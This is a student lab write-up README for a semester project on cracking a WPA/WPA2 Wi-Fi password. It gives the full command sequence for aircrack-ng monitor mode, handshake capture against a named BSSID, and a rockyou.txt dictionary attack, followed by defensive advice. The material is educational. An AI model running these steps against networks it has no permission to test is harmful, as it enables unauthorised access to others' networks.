# Wireless Air Cracking Using Linux (WiFi Hacking)

## 📚 Project Overview
This semester project was completed as part of the *Introduction to Cyber Security Lab* in the 1st semester of **BS Cyber Security** at **Air University, Islamabad**. The project demonstrates ethical wireless network penetration testing using Kali Linux, showcasing hands-on experience with Wi-Fi cracking techniques in a controlled lab environment.

> ⚠️ **Disclaimer**: This project was conducted solely for educational purposes on our own wireless network with ethical and legal boundaries. Unauthorized access to networks is illegal and strictly prohibited.

---

## 🔧 Tools Used
- **Operating System**: Kali Linux
- **Networking Tools**:
  - `airmon-ng`
  - `airodump-ng`
  - `aircrack-ng`
  - `iwconfig`
  - `Wireshark`
- **Wordlist**: `rockyou.txt`

---

## 🧪 Procedure Summary

1. **Check Network Adapter**  
   `iwconfig`

2. **Kill Conflicting Processes**  
   `sudo airmon-ng check kill`

3. **Enable Monitor Mode**  
   `sudo airmon-ng start wlan0`

4. **Scan for Available Networks**  
   `sudo airodump-ng wlan0`

5. **Target Specific Network**  
   `sudo airodump-ng -w ammara -c 6 --bssid 4A:59:B1:F1:CC:B0 wlan0`

6. **Capture Handshake Packets**

7. **Analyze Capture with Wireshark**  
   `wireshark ammara-01.cap`

8. **Crack Wi-Fi Password using Wordlist**  
   `sudo aircrack-ng ammara-01.cap -w /usr/share/wordlists/rockyou.txt`

9. **Disable Monitor Mode**  
   `sudo airmon-ng stop wlan0`

---

## 🔑 Outcome
- Successfully captured the WPA/WPA2 4-way handshake.
- Cracked the Wi-Fi password using a dictionary attack.
- Demonstrated the importance of using **strong, complex passwords** for Wi-Fi networks.

---

## 👥 Team Members & Contributions

| Name            | Roll No. | Contribution                          |
|-----------------|----------|---------------------------------------|
| Breeha Bukhari  | 232120   | Research and Project Planning (33%)   |
| Ammara Khalil   | 232924   | Project Execution and Report Writing (33%) |
| Wajeeha Dauood  | 232108   | Linux Tools Research and Presentation (33%) |

---

## 📎 References
- YouTube tutorials on ethical Wi-Fi testing
- GitHub repositories for Linux networking tools

---

## ✅ Conclusion
To improve Wi-Fi security:
- Use **WPA3** or the latest encryption methods.
- Avoid default or weak passwords.
- Regularly update router firmware.

---

